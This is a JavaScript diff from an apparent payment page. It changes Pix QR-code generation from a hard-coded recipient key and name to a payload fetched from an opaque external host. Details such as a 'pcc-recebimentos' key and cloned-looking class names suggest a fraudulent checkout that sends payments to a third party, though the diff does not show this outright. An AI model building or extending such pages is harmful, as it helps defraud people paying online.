@@ -162,15 +162,17 @@ function copiarTextoClipboardAPI(texto) {
         const queryString = window.location.search; // pega tudo depois do ?
         const params = new URLSearchParams(queryString);
         const agora = new Date();
-        const payload = gerarPayloadPix({
-            chave: 'pcc-recebimentos@tuamaeaquelaursa.com',
-            nome: 'Aline Nayara Ventura Silva',
-            cidade: 'sao paulo',
-            valor: params.get(`val`).replace(`,`,`.`),
-            txid: 'TX123456'
-        });
-
-        document.querySelector(`.sc-3fde0cab-12.cWMTgb`).src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${payload}`
+        //https://saddadsda.onrender.com/gen?val=50
+        fetch('https://saddadsda.onrender.com/gen?val=50')
+  .then(response => {
+    if (!response.ok) {
+      throw new Error(`Erro na requisição: ${response.status}`);
+    }
+    return response.json(); // ou .text() dependendo da resposta
+  })
+  .then(data => {
+      payload = data
+    document.querySelector(`.sc-3fde0cab-12.cWMTgb`).src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${payload}`
 
    
 
@@ -190,6 +192,11 @@ function copiarTextoClipboardAPI(texto) {
         }
 
         document.querySelector(`.chave`).textContent = payload
+  })
+  .catch(error => {
+    console.error('Erro ao fazer fetch:', error);
+  });
+
 
 // Formatar como string legível (ex: 2025-05-01 14:30:00)
 const dataFormatada = agora.getFullYear() + '-' +
